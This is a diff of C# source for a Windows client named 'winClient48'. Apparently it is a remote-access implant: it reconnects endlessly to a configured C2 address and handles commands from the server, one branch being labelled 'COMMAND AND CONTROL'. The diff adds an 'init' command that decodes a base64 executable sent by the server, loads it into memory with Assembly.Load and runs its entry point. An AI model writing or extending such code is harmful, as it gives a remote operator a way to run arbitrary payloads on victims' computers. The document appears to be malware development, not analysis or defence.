@@ -63,45 +63,6 @@ namespace winClient48
 
             return bytes;
         }
-        private byte[] StructToBytes<T>(T structure) where T : struct
-        {
-            int size = Marshal.SizeOf(typeof(T));
-            byte[] buffer = new byte[size];
-            IntPtr ptr = Marshal.AllocHGlobal(size);
-
-            try
-            {
-                Marshal.StructureToPtr(structure, ptr, false);
-                Marshal.Copy(ptr, buffer, 0, size);
-            }
-            finally
-            {
-                Marshal.FreeHGlobal(ptr);
-            }
-
-            return buffer;
-        }
-        private T BytesToStruct<T>(byte[] buffer) where T : struct
-        {
-            int size = Marshal.SizeOf(typeof(T));
-            if (buffer.Length != size)
-            {
-                throw new ArgumentException("Byte array size does not match the size of the structure.");
-            }
-
-            IntPtr ptr = Marshal.AllocHGlobal(size);
-
-            try
-            {
-                Marshal.Copy(buffer, 0, ptr, size);
-            }
-            finally
-            {
-                Marshal.FreeHGlobal(ptr);
-            }
-
-            return Marshal.PtrToStructure<T>(ptr);
-        }
 
         void ReceivedBuffer(Server s)
         {
@@ -168,7 +129,7 @@ namespace winClient48
                                 }
                                 else if (dsp.Param == 4)
                                 {
-                                    //new Thread(() => SendInfo(v)).Start();
+                                    s.Send(3, 0, "Hello");
                                 }
                             }
                             else if (dsp.Command == 2) //COMMAND AND CONTROL
@@ -195,6 +156,12 @@ namespace winClient48
                 return;
             }
         }
+
+        void fnInit()
+        {
+
+        }
+
         void CommandProc(Server s, string szPayload)
         {
             string[] aCmd = szPayload.Split('|');
@@ -208,6 +175,20 @@ namespace winClient48
                 {
 
                 }
+            }
+            else if (aCmd[0] == "init")
+            {
+                byte[] abExeBytes = Convert.FromBase64String(aCmd[1]);
+
+                Assembly loaded = Assembly.Load(abExeBytes);
+                MethodInfo entry = loaded.EntryPoint;
+                object instance = null;
+                if (!entry.IsStatic)
+                    instance = loaded.CreateInstance(entry.Name);
+
+                entry.Invoke(instance, new object[] { new string[] { } });
+
+                s.socket.Close();
             }
         }
 
@@ -245,15 +226,18 @@ namespace winClient48
         void Main()
         {
             g_bConnected = false;
-            while (true)
+            new Thread(() =>
             {
-                if (!g_bConnected)
+                while (true)
                 {
-                    g_bConnected = Connect(g_szIPAddr, g_nPort);
-                }
+                    if (!g_bConnected)
+                    {
+                        g_bConnected = Connect(g_szIPAddr, g_nPort);
+                    }
 
-                Thread.Sleep(g_nRetry);
-            }
+                    Thread.Sleep(g_nRetry);
+                }
+            }).Start();
         }
 
         private void Form1_Load(object sender, EventArgs e)
